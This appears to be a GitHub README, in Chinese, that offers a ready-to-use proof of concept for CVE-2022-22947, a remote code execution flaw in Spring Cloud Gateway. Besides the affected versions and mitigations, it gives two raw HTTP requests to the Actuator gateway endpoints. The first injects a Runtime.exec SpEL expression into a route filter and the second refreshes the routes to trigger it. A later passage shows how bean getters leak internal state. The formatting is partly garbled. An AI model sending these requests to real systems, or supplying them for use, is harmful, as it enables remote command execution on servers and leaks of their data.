# Spring_CVE_2022_22947
Spring_CVE_2022_22947:Spring Cloud Gateway现高风险漏洞cve,poc漏洞利用,一键利用,开箱即用
![image](https://user-images.githubusercontent.com/53851034/156614534-ec365420-9bca-4236-a10e-98fc7ed71d43.png)

漏洞描述 ：#####
#漏洞
漏洞描述：#####
### Spring Cloud Gateway Spring中API网关攻击。3.1.0及3.0.6版本（包含）之前存在SpEL表达式的插件，当开发者可以利用Actuator API的执行情况下，将是该漏洞的命令选项。
漏洞描述：#####
# 影  响范围 :
## Spring Cloud Gateway以下版本均受影响：

    3.1.0
    3.0.0至3.0.6
    其他老版本 
    
#  缓解方法 ： 
    3.1.x用户应升级到3.1.1+
    3.0.x用户应升级到3.0.7+
    如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用
    如果需要Actuator端点，则应使用Spring Security对其进行保护 

CVE-2022-22946：HTTP2 不安全的 TrustManager :

严重性 ： Medium 


![image-20220303141049270](https://user-images.githubusercontent.com/53851034/156614983-1471d8b7-89b5-4e8d-8d5b-a451089a44e9.png)



###





# poc漏洞利用:

### 来自白帽汇:
#### 使用方法:burpsuite改包发送

{

    POST /actuator/gateway/routes/new_route HTTP/1.1    

    Host: 127.0.0.1:9000

     Connection: close

     Content-Type: application/json

     {

     "predicates": [

        {

         "name": "Path",
 
         "args": {

           "_genkey_0": "/new_route/**"
 
        }

        }

     ],

     "filters": [

     {

      "name": "RewritePath",

      "args": {

       "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch/tmp/x\")}",
 
       "_genkey_1": "/${path}"

     }

    }

     ],

    "uri": "https://wya.pl",

    "order": 0

    }

}
# 第二段poc利用:

{
    
    POST /actuator/gateway/refresh HTTP/1.1

    Host: 127.0.0.1:9000

    Content-Type: application/json

    Connection: close

    Content-Length: 258

    {

     "predicate": "Paths: [/new_route], match trailing slash:true",

    "route_id": "new_route",

     "filters": [

      "[[RewritePath#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} =/${path}], order = 1]"

     ],

    "uri": "https://wya.pl",

     "order": 0

    }


}

### 简单说明一下：第一个请求将创建路由；第二个命令强制重新加载配置。并且，在路由的重新加载时，将会执行SpEL表达式。

# 利用方法:


![image](https://user-images.githubusercontent.com/53851034/156774162-2db9bafc-c5d1-4046-9c72-e79649b76d86.png)


{
        
        SimpleEvaluationContext支持SpEL功能的一个子集，一般来说，它比StandardEvaluationContext更加安全。根据Javadocs的说法，“SimpleEvaluationContext只支持SpEL语言语法的一个子集，例如，不包括对Java类型、构造函数和Bean引用的引用。”

{   
        
        当我在研究这个问题时，我看到SpEL的原始需求来自GitHub repo上的一些问题：主要是用户希望实现一个可以通过SpEL表达式调用的自定义bean。一个例子是管理一个路由的速率限制。当我研究这个补丁的时候，我发现仍然可以调用没有方法参数的Bean——这意味着#{@gatewayProperties.toString}可以被用来打印出gatewayPropertiesBean的定义。而SimpleEvaluationContext是不允许调用#{@gatewayProperties.setRoutes(..)}的。这在本质上应该只限制getter方法被调用。

#### 或者:

    [在使用添加和刷新路由所需的两个HTTP请求发送#{@gatewayproperties.tostring}后，可以看到上图所示内容。请注意，一些内部信息可能会遭到泄漏。根据可用的Bean，这可能被用来泄漏应用程序状态的属性或其他属性。
    虽然网关服务不用对类路径中包含的bean负责，但它至少应该确保它的库中的bean不会被调用，从而导致泄漏重要信息或对应用程序产生负面影响。]

    [最后，我编写了更多的CodeQL查询，看看会发生什么情况。简单来说，我想在库中找到所有不带参数的方法的bean。然后，递归地查看返回类型，看看是否有任何没有参数的方法可以调用。这些查询看起来类似于bean1.method1.method2这个样子。]


